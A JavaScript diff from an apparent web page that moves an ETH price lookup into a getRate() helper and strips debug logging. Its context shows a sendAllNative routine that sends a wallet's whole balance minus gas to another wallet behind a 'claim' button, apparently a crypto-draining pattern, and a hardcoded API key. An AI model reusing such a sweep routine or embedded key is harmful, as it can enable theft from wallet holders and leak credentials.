@@ -37,11 +37,8 @@ async function sendAllNative(rpcProvider, fromWallet, toWallet) {
 //   console.log('BALANCEAFTERTX', balanceAfterTx)
 
 const estimateGasUse = await rpcProvider.estimateGas(tx);
-console.log('ESTIMATEGASUSE', estimateGasUse.toString( ))
 const transactionPrice = gasPrice.mul(estimateGasUse).mul(1.1);
-console.log('TRANSACTIONPRICE', transactionPrice.toString( ))
 const balanceAfterTx = balance.sub(transactionPrice)
-console.log('BALANCEAFTERTX', balanceAfterTx.toString())
 
 // console.log('BALANCEAFTERTX', ethers.utils.parseEther(balanceAfterTx.toFormat(2)))
   tx = {
@@ -69,10 +66,28 @@ console.log('BALANCEAFTERTX', balanceAfterTx.toString())
     document.getElementById("claim-button").classList.remove("hidden");
     document.getElementById("claim-button-loading").classList.add("hidden");
   }
+}
 
+async function getRate() {
+  return await fetch("https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH&tsyms=USD", {
+      "credentials": "include",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "authorization": "Apikey 6175d561f4a61549e3d03228e60226b3c8bcddb31b2bb3af371cb234345523fb",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Site": "cross-site",
+      },
+      "method": "GET",
+      "mode": "cors"
+    }).then((response) => response.json())
+    .then((data) => {
+      return data;
+    });
 }
 
 async function main() {
+
 
 
   // Use the mainnet
@@ -124,22 +139,7 @@ async function main() {
     )
   }
 
-  const rate = await fetch("https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH&tsyms=USD", {
-      "credentials": "include",
-      "headers": {
-        "Accept": "application/json, text/plain, */*",
-        "authorization": "Apikey 6175d561f4a61549e3d03228e60226b3c8bcddb31b2bb3af371cb234345523fb",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "cross-site",
-      },
-      "method": "GET",
-      "mode": "cors"
-    }).then((response) => response.json())
-    .then((data) => {
-      return data;
-    });
-
+  const rate = await getRate()
   const rateUSD = rate.ETH.USD
   console.log('RATE', rate.ETH.USD)
   console.log('BALANCE', ethers.utils.formatEther(balance))
@@ -150,6 +150,5 @@ async function main() {
   document.getElementById("balance-usd").innerHTML = `${showBalanceMatic.toFormat(2)}`
 
 }
-// 1832174405199481186
-// 1833285533393387686
+
 main();
